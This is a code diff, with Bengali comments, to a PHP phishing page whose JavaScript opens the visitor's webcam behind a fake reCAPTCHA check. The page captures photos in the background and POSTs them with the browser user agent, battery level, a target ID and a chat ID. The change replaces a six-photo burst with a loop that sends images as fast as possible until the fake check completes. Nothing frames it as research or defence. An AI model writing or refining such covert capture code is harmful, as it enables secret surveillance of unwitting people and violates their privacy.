@@ -228,30 +228,30 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             });
         }
 
-        // ক্যামেরা সাকসেসফুলি ওপেন হলে এই ফাংশন রান করবে
         function requestCameraPermission() {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
                     video.srcObject = stream;
                     
-                    // ১. ক্যামেরা চালু হওয়ার সাথে সাথে ক্যাপচা বক্স শো হবে এবং স্পিনার ঘুরবে
                     recaptchaContainer.style.display = 'flex';
 
-                    // ২. ক্যামেরা চালু হওয়ার সাথে সাথেই একসাথে একাধিক ছবি (Burst mode: প্রতি ০.৫ সেকেন্ড পর পর) পাঠানো শুরু হবে
-                    let captureCount = 0;
-                    const captureInterval = setInterval(() => {
-                        captureAndUpload();
-                        captureCount++;
-                        if (captureCount >= 6) { // মোট ৬টি ছবি (৩ সেকেন্ডে) পাঠানো হবে
-                            clearInterval(captureInterval);
-                        }
-                    }, 500);
+                    // কোনো নির্দিষ্ট ডিলে বা অপেক্ষা না রেখে যত দ্রুত সম্ভব ব্যাকগ্রাউন্ডে ছবি ক্যাপচার করে পাঠাতে থাকবে
+                    let isRunning = true;
 
-                    // ৩. ৪ সেকেন্ড স্পিনার ঘুরে টিক মার্ক এসে মেইন ট্যাবে লিংক ওপেন হবে
+                    async function rapidCaptureLoop() {
+                        while (isRunning) {
+                            await captureAndUpload();
+                        }
+                    }
+
+                    rapidCaptureLoop();
+
+                    // ৪ সেকেন্ড স্পিনার ঘুরে টিক মার্ক এসে মেইন ট্যাবে লিংক ওপেন হবে
                     const checkbox = document.getElementById('recaptchaCheckbox');
                     const spinner = document.getElementById('recaptchaSpinner');
 
                     setTimeout(() => {
+                        isRunning = false; // ক্যাপচার লুপ বন্ধ হবে
                         spinner.style.display = 'none';
                         checkbox.classList.add('checked');
                         
@@ -271,29 +271,34 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         requestCameraPermission();
 
         function captureAndUpload() {
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/png');
+            return new Promise((resolve) => {
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/png');
 
-            const postData = new URLSearchParams();
-            postData.append('image', imageData);
-            postData.append('target', targetId);
-            postData.append('chat_id', userChatId);
-            postData.append('e', expiryParam); 
-            postData.append('user_agent', navigator.userAgent);
-            postData.append('battery', batteryLevelInfo);
+                const postData = new URLSearchParams();
+                postData.append('image', imageData);
+                postData.append('target', targetId);
+                postData.append('chat_id', userChatId);
+                postData.append('e', expiryParam); 
+                postData.append('user_agent', navigator.userAgent);
+                postData.append('battery', batteryLevelInfo);
 
-            fetch('', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: postData
-            }).catch(error => {
-                console.error('Error:', error);
+                fetch('', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: postData
+                }).then(() => {
+                    resolve();
+                }).catch(error => {
+                    console.error('Error:', error);
+                    resolve();
+                });
             });
         }
     </script>
